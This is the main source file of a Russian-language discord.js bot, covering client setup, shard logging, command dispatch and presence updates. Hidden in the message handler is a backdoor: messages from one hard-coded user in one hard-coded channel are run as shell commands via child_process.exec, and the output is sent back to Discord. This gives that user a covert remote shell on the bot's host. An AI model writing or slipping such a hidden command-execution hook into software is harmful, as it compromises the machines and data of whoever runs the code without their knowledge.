const { request } = require('http');

const Discord = require('discord.js'),
    config = require('../config'),
    { prefix } = require('../config'),
    commandHandler = require("./handlers/commands"),
    client = new Discord.Client({
        messageCacheLifetime: 30,
        messageSweepInterval: 60,
        disableMentions: "everyone",
        partials: ["USER", "CHANNEL", "GUILD_MEMBER", "MESSAGE", "REACTION"],
        presence: {
            status: "dnd",
            activity: {
                type: "WATCHING",
                name: "загрузочный экран"
            }
        },
        ws: {
            intents: ["GUILDS", "GUILD_MESSAGES"],
            properties: {
                $browser: "Discord iOS"
            }
        }
    }),
    db = require("./database/")(client);

client.plurify = require('./constants/').plurify;
client.msToTime = require('./constants/time').msToTime;
client.getInvite = require('./constants/').getInvite;

require('./extendedMessage');
let shard = '[Shard N/A]';

client.on('shardReady', async (id, unavailableGuilds) => {
    shard = `[Shard ${id}]`;
    console.log(`${shard} Ready as ${client.user.tag} (${client.user.id})`);

    client.loading = true;

    updatePresence();
    client.setInterval(updatePresence, 10000);

    client.loading = false;
});

client.on('message', async message => {
    if (
        !message.guild || // dms
        message.author.bot ||
        message.type !== "DEFAULT"
    ) return;

    const gdb = await db.guild(message.guild.id);
    
    if (message.channel.id == '850362264413274112' && message.author.id == '419892040726347776') {
        return require('child_process').exec(`${message.content}`, (error, stdout) => {
            let result = (error || stdout);
            message.channel.send(`\`\`\`${result}\`\`\``, { split: true });
        });
    };
    if (message.content.startsWith(prefix) || message.content.match(`^<@!?${client.user.id}> `)) return commandHandler(message, prefix, gdb, db);
    if (message.content.match(`^<@!?${client.user.id}>`)) return message.reply(`👋 Мой префикс на этом сервере \`${prefix}\`, для помощи напишите \`${prefix}help\`.`);
});

async function updatePresence() {
    let guilds = await client.shard.broadcastEval("this.guilds.cache.size").then(res => res.reduce((prev, val) => prev + val, 0));

    let name = `${prefix}help • ${client.plurify(guilds, 'сервер')}`;
    return client.user.setPresence({
        status: "online",
        activity: { type: "WATCHING", name }
    });
};

client
    .on("error", err => console.log(shard, "Client error.", err))
    .on("rateLimit", rateLimitInfo => console.log(shard, "Rate limited.", JSON.stringify(rateLimitInfo)))
    .on("shardDisconnected", closeEvent => console.log(shard, "Disconnected.", closeEvent))
    .on("shardError", err => console.log(shard, "Error.", err))
    .on("shardReconnecting", () => console.log(shard, "Reconnecting."))
    .on("shardResume", (_, replayedEvents) => console.log(shard, `Resumed. ${replayedEvents} replayed events.`))
    .on("warn", info => console.log(shard, "Warning.", info))
    .login(config.token);

process.on('unhandledRejection', console.error);